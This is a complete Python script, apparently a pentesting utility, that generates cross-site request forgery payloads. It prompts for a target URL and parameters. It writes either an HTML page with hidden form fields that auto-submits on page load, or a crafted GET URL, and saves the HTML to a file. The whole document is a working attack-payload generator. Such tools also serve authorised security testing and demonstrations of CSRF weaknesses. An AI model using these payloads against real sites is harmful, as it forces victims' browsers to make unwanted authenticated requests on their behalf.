import urllib.parse

def post_method(url):
    """Generate a POST HTML payload and save to file"""
    num_params = int(input("How many parameters in your HTTP request? "))
    params = {}

    for _ in range(num_params):
        param = input("Enter parameter name: ")
        value = input(f"Enter {param}'s value: ")
        params[param] = value

    # Generate HTML form
    html = (
        f"<html>\n"
        f"  <body onload='document.forms[0].submit();'>\n"
        f"    <form action='{url}' method='POST'>\n"
    )

    for k, v in params.items():
        html += f"      <input type='hidden' name='{k}' value='{v}'>\n"

    html += "    </form>\n  </body>\n</html>"

    print("\nGenerated CSRF HTML Payload:\n")
    print(html)

    filename = input("Enter your file name to save payload: ")
    with open(filename + ".html", "w") as f:
        f.write(html)

    print(f"\nPayload saved to {filename}.html")


def get_method(url):
    """Generate a GET URL payload"""
    num_params = int(input("How many parameters in your HTTP request? "))
    params = {}

    for _ in range(num_params):
        param = input("Enter parameter name: ")
        value = input(f"Enter {param}'s value: ")
        params[param] = value

    # Generate URL payload
    payload = url
    if num_params > 0:
        payload += "?"
        for k, v in params.items():
            payload += urllib.parse.quote_plus(k) + "=" + urllib.parse.quote_plus(v) + "&"
        payload = payload[:-1]  # remove trailing "&"

    print("\nPayload URL generated:\n" + payload)


def main():
    print("Welcome to CSRF payload generation")
    print("Please enter details of HTTP request\n")

    url = input("Enter target server URL: ")
    print("\nHTTP method:")
    print("1. POST      2. GET")
    op = int(input("Choose an option: "))

    if op == 1:
        post_method(url)
    elif op == 2:
        get_method(url)
    else:
        print("Invalid option")


if __name__ == "__main__":
    main()
